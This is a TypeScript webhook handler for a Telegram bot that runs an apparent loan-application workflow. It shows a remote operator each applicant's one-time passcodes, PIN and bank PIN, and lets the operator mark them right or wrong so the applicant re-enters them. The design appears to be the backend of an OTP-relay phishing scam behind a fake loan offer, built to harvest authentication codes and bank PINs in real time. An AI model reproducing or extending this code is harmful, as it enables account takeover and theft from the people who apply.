import {
  audit,
  findApplication,
  getSql,
  setStatus,
} from "../../../lib/applications";

export const runtime = "nodejs";

type TelegramUpdate = {
  callback_query?: {
    id: string;
    data?: string;
    from?: {
      id?: number;
    };
    message?: {
      message_id: number;
      chat?: {
        id?: number;
      };
    };
  };

  message?: {
    from?: {
      id?: number;
    };
    chat?: {
      id?: number;
    };
  };
};

async function telegram(
  method: string,
  body: Record<string, unknown>
) {
  const token = process.env.TELEGRAM_BOT_TOKEN;

  if (!token) {
    throw new Error(
      "TELEGRAM_BOT_TOKEN is missing"
    );
  }

  const response = await fetch(
    `https://api.telegram.org/bot${token}/${method}`,
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(body),
    }
  );

  const result = (await response.json()) as {
    ok?: boolean;
    description?: string;
  };

  if (
    !response.ok ||
    !result.ok
  ) {
    throw new Error(
      `${method} failed (${response.status}): ${
        result.description ||
        "Unknown Telegram error"
      }`
    );
  }
}

export async function POST(
  request: Request
) {
  const expectedSecret =
    process.env.TELEGRAM_WEBHOOK_SECRET;

  if (
    expectedSecret &&
    request.headers.get(
      "x-telegram-bot-api-secret-token"
    ) !== expectedSecret
  ) {
    console.error(
      "[telegram:webhook] rejected invalid secret"
    );

    return new Response(
      "Forbidden",
      {
        status: 403,
      }
    );
  }

  try {
    const update =
      (await request.json()) as TelegramUpdate;

    const query =
      update.callback_query;

    const actor = String(
      query?.from?.id ||
        update.message?.from?.id ||
        ""
    );

    const chatId = String(
      query?.message?.chat?.id ||
        update.message?.chat?.id ||
        ""
    );

    /*
     * Only the configured Telegram administrator
     * is allowed to use these actions.
     */
    if (
      !process.env.TELEGRAM_ADMIN_USER_ID ||
      actor !==
        String(
          process.env.TELEGRAM_ADMIN_USER_ID
        ) ||
      chatId !==
        String(
          process.env.TELEGRAM_ADMIN_CHAT_ID
        )
    ) {
      console.warn(
        "[telegram:webhook] ignored unauthorized update",
        {
          actor,
          chatId,
        }
      );

      return new Response("OK");
    }

    const callback = String(
      query?.data || ""
    );

    if (!query || !callback) {
      return new Response("OK");
    }

    const [
      action,
      applicationId,
    ] = callback.split(":");

    const row =
      await findApplication(
        applicationId
      );

    if (!row) {
      await telegram(
        "answerCallbackQuery",
        {
          callback_query_id:
            query.id,
          text: "Application not found",
          show_alert: true,
        }
      );

      return new Response("OK");
    }

    let text = "";

    let keyboard:
      | Record<string, unknown>
      | undefined;

    let nextStatus = row.status;

    /*
     * VIEW APPLICATION
     */
    if (action === "view") {
      text = `📋 LOAN APPLICATION

👤 Applicant: ${row.full_name}
📱 Phone: ${row.phone}
💼 Loan: ${row.loan_product}
💰 Requested: DJF ${Number(
        row.requested_amount
  ).toLocaleString("fr-DJ")}
📅 Repayment: ${row.repayment_period} months
📝 Purpose: ${row.purpose}
📍 Status: ${row.status}`;

      keyboard = {
        inline_keyboard: [
          [
            {
             text:
                "🔐 Verify",
              callback_data: `verify:${applicationId}`,
            },
            {
              text: "✖ Reject",
              callback_data: `reject:${applicationId}`,
            },
          ],
        ],
      };
    }

    /*
     * REQUEST FIRST OTP
     */
    else if (
      action === "verify" &&
      [
        "SUBMITTED",
        "UNDER_REVIEW",
      ].includes(row.status)
    ) {
      nextStatus =
        "OTP_PENDING";

      await setStatus(
        applicationId,
        nextStatus
      );

      text = `🔐 OTP REQUESTED

👤 Applicant: ${row.full_name}

`;
    }

    /*
     * CONFIRM FIRST OTP
     */
    else if (
      action === "confirm_first_otp" &&
      row.status ===
        "MEMBERSHIP_NUMBER_PENDING"
    ) {
      nextStatus =
        "MEMBERSHIP_ID_REQUIRED";

      await setStatus(
        applicationId,
        nextStatus
      );

      text = `✅ FIRST OTP IS CORRECT

👤 Applicant: ${row.full_name}
🔢 OTP: ${row.membership_id || "Not provided"}

`;
    }

    /*
    * CONFIRM PIN
     */
    else if (
      action === "confirm_pin" &&
      row.status ===
        "SECOND_OTP_REQUIRED"
    ) {
      nextStatus = "PIN_CONFIRMED";

      await setStatus(
        applicationId,
        nextStatus
      );

      text = `✅ PIN CONFIRMED

👤 Applicant: ${row.full_name}
🔢 PIN: ${row.member_code || "Not provided"}

Waiting for final OTP.`;
    }

    /*
     * FIRST OTP MARKED WRONG
     */
    else if (
      action === "wrong_first_otp" &&
      [
        "MEMBERSHIP_NUMBER_PENDING",
        "MEMBERSHIP_ID_REQUIRED",
      ].includes(row.status)
    ) {
      nextStatus =
        "OTP_PENDING";

      await getSql()`
        UPDATE loan_applications
        SET
          membership_id = NULL,
          status = ${nextStatus},
          updated_at = NOW()
        WHERE application_id = ${applicationId}
      `;

      await audit(
        applicationId,
        "FIRST_OTP_RETRY_REQUESTED",
        "system"
      );

      text = `❌ FIRST OTP IS WRONG

👤 Applicant: ${row.full_name}

`;
    }

    /*
     * FINAL PIN MARKED WRONG
     */
    else if (
      action === "wrong_pin" &&
      row.status ===
        "FINAL_APPROVAL_PENDING"
    ) {
      nextStatus = "MEMBERSHIP_ID_REQUIRED";

      await getSql()`
        UPDATE loan_applications
        SET
          member_code = NULL,
          membership_number = NULL,
          status = ${nextStatus},
          updated_at = NOW()
        WHERE application_id = ${applicationId}
      `;

      await audit(
        applicationId,
        "PIN_RETRY_REQUESTED",
        "system"
      );

      text = `❌ PIN IS WRONG

👤 Applicant: ${row.full_name}

Please enter the PIN again.`;
    }

    /*
    * PIN MARKED WRONG
     */
    else if (
      action === "wrong_pin" &&
      ["SECOND_OTP_REQUIRED", "PIN_CONFIRMED"].includes(row.status)
    ) {
      nextStatus = "MEMBERSHIP_ID_REQUIRED";

      await getSql()`
        UPDATE loan_applications
        SET
          member_code = NULL,
          membership_number = NULL,
          status = ${nextStatus},
          updated_at = NOW()
        WHERE application_id = ${applicationId}
      `;

      await audit(
        applicationId,
        "PIN_RETRY_REQUESTED",
        "system"
      );

      text = `❌ PIN IS WRONG

👤 Applicant: ${row.full_name}

    Please enter the PIN again.`;
    }

    /*
     * FINAL OTP MARKED WRONG
     */
    else if (
      action === "wrong_code" &&
      row.status ===
        "FINAL_APPROVAL_PENDING"
    ) {
      nextStatus =
        "SECOND_OTP_REQUIRED";

      await getSql()`
        UPDATE loan_applications
        SET
          membership_number = NULL,
          status = ${nextStatus},
          updated_at = NOW()
        WHERE application_id = ${applicationId}
      `;

      await audit(
        applicationId,
        "FINAL_OTP_RETRY_REQUESTED",
        "system"
      );

      text = `❌ FINAL OTP IS WRONG

👤 Applicant: ${row.full_name}
🔐 PIN: ${
        row.member_code ||
        "Not provided"
      }

`;
    }

    /*
     * REJECT APPLICATION
     */
    else if (
      action === "reject" &&
      ![
        "DISBURSED",
        "REJECTED",
      ].includes(row.status)
    ) {
      nextStatus =
        "REJECTED";

      await setStatus(
        applicationId,
        nextStatus
      );

      text = `❌ APPLICATION REJECTED

👤 Applicant: ${row.full_name}`;
    }

    /*
     * APPROVE LOAN
     */
    else if (
      action === "approve" &&
      row.status ===
        "FINAL_APPROVAL_PENDING"
    ) {
      nextStatus =
        "APPROVED";

      await setStatus(
        applicationId,
        nextStatus
      );

      text = `✅ LOAN APPROVED

👤 Applicant: ${row.full_name}
💰 Amount: DJF ${Number(
        row.requested_amount
  ).toLocaleString("fr-DJ")}`;

      keyboard = {
        inline_keyboard: [
          [
            {
              text: "🏦 Request Bank PIN",
              callback_data: `request_bank:${applicationId}`,
            },
          ],
        ],
      };
    }

    else if (
      action === "request_bank" &&
      row.status === "APPROVED"
    ) {
      nextStatus = "APPROVED";
      text = `🏦 BANK PIN REQUIRED\n\n👤 Applicant: ${row.full_name}\n💰 Amount: DJF ${Number(row.requested_amount).toLocaleString("fr-DJ")}\n\nWaiting for the applicant to submit a 4-digit bank number.`;
    }

    else if (
      action === "confirm_bank" &&
      row.status === "BANK_NUMBER_PENDING"
    ) {
      nextStatus = "BANK_NUMBER_CONFIRMED";
      await setStatus(applicationId, nextStatus);
      text = `✅ BANK PIN CONFIRMED\n\n👤 Applicant: ${row.full_name}\n🔢 Number: ${row.bank_number || "Not provided"}\n💰 Amount: DJF ${Number(row.requested_amount).toLocaleString("fr-DJ")}`;
      keyboard = { inline_keyboard: [[{ text: "💸 Disburse", callback_data: `disburse:${applicationId}` }]] };
    }

    else if (
      action === "wrong_bank" &&
      row.status === "BANK_NUMBER_PENDING"
    ) {
      nextStatus = "APPROVED";
      await getSql()`UPDATE loan_applications SET bank_number=NULL, status=${nextStatus}, updated_at=NOW() WHERE application_id=${applicationId}`;
      await audit(applicationId, "BANK_NUMBER_RETRY_REQUESTED", "telegram_admin");
      text = `❌ BANK PIN NEEDS CHANGING\n\n👤 Applicant: ${row.full_name}\n\nWaiting for a new 4-digit bank pin.`;
    }

    /*
     * DISBURSE LOAN
     */
    else if (
      action === "disburse" &&
      row.status === "BANK_NUMBER_CONFIRMED"
    ) {
      nextStatus =
        "DISBURSED";

      await setStatus(
        applicationId,
        nextStatus
      );

      text = `💸 LOAN DISBURSED

👤 Applicant: ${row.full_name}
💰 Amount: DJF ${Number(
        row.requested_amount
  ).toLocaleString("fr-DJ")}`;
    }

    /*
     * NO VALID ACTION
     */
    else {
      await telegram(
        "answerCallbackQuery",
        {
          callback_query_id:
            query.id,
          text: `${row.full_name}: no action available while status is ${row.status}`,
          show_alert: true,
        }
      );

      return new Response("OK");
    }

    /*
     * UPDATE TELEGRAM MESSAGE
     */
    await telegram(
      "editMessageText",
      {
        chat_id:
          query.message?.chat?.id,

        message_id:
          query.message?.message_id,

        text,

        reply_markup:
          keyboard,
      }
    );

    /*
     * CONFIRM CALLBACK
     */
    await telegram(
      "answerCallbackQuery",
      {
        callback_query_id:
          query.id,

        text:
          nextStatus === row.status
            ? `${row.full_name}: details refreshed`
            : `${row.full_name}: status changed to ${nextStatus}`,
      }
    );

    console.log(
      "[telegram:webhook] callback completed",
      {
        action,
        applicationId,
        previousStatus:
          row.status,
        nextStatus,
      }
    );

    return new Response("OK");
  } catch (error) {
    console.error(
      "[telegram:webhook] failed",
      {
        error: String(error),

        stack:
          error instanceof Error
            ? error.stack
            : undefined,
      }
    );

    return new Response(
      "Internal Server Error",
      {
        status: 500,
      }
    );
  }
}